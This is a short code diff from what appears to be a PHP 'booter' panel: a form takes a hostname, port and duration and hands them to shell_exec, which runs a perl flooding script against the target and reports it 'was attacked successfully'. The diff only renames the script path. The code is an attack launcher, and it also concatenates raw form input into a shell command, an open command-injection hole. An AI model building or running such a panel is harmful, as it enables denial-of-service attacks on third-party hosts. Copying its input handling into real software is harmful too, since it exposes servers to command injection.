@@ -34,7 +34,7 @@ if(isset($_POST['hostname']) && isset($_POST['port']) && isset($_POST['time'])) 
 	} elseif($time < 1) {
 		echo "Permanent attack isn't allowed!";
 	} else {
-		$data = "perl /var/www/html/trex.pl ".$ip." ".$port." ".$time; //Your script + directory goes here.
+		$data = "perl /var/www/html/trex ".$ip." ".$port." ".$time; //Your script + directory goes here.
 		shell_exec($data);
 		echo $ip." was attacked successfully on port ".$port." for ".$time." seconds.";
 	}
